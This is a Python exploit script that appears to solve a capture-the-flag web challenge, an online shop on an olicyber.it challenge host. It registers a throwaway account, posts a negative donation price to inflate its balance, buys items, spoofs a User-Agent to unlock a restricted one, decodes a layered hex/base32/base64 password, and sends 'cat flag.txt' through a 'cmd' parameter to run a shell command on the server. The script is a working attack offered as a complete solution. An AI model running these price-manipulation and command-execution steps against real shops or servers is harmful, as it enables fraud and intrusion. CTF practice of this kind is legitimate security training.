import requests, base64, os

s = requests.Session()
url = 'http://itasecshop.challs.olicyber.it'

s.request('POST', url + '/register', headers={'Content-Type' : 'application/x-www-form-urlencoded'} ,data={'user': os.urandom(10), 'psw': os.urandom(10)}, allow_redirects=True)

s.request('POST', url + '/store/donate', headers={'Content-Type' : 'application/x-www-form-urlencoded'}, data={'price': '-100000000000'}, allow_redirects=True)
response = s.request('POST', url + '/store/1/buy', headers={'Content-Type' : 'application/x-www-form-urlencoded'}, allow_redirects=True)
print(response.text.split('\n')[-18][15:])

response = s.request('POST', url + '/store/5/buy', headers={'Content-Type' : 'application/x-www-form-urlencoded', 'User-Agent': 'Samsung Smart Fridge'}, allow_redirects=True)
print(response.text.split('\n')[-18])

cat_food = "47 52 52 53 41 4e 4a 54 45 41 5a 54 41 49 42 58 47 51 51 44 4b 4e 4a 41 47 51 32 43 41 4e 4a 53 45 41 33 57 43 49 42 57 47 4d 51 44 47 4d 5a 41 47 59 5a 53 41 4e 5a 58 45 41 33 44 47 49 42 57 4d 51 51 44 4b 4d 4a 41 47 5a 52 43 41 4e 44 42 45 41 32 44 47 49 42 56 47 45 51 44 4d 59 52 41 47 52 51 53 41 4e 42 54 45 41 32 54 45 49 42 54 47 45 51 44 4d 4d 5a 41 47 51 33 53 41 4e 4a 57 45 41 33 54 53 49 42 56 47 55 51 44 47 4d 52 41 47 5a 52 53 41 4e 54 42 45 41 33 44 49 49 42 56 48 41 51 44 49 59 4a 41 47 59 34 43 41 4e 4a 52 45 41 32 44 4b 49 42 55 47 45 51 44 4d 59 4a 41 47 51 34 53 41 4e 5a 5a 45 41 32 47 49 49 42 57 48 41 51 44 4d 4d 52 41 47 55 33 53 41 4e 4a 57 45 41 33 44 51 49 42 57 47 51 51 44 4f 4f 4a 41 47 4d 59 43 41 4e 5a 55 45 41 32 47 47 49 42 56 47 45 51 44 47 5a 42 41 47 4e 53 41 3d 3d 3d 3d"
password = base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ", "")).decode()).decode()).decode()).decode()

response = s.request('GET', url + '/cats', headers={'Content-Type' : 'application/x-www-form-urlencoded'}, params={'psw': password, 'cmd': 'cat flag.txt'}, allow_redirects=True)
print(response.text)

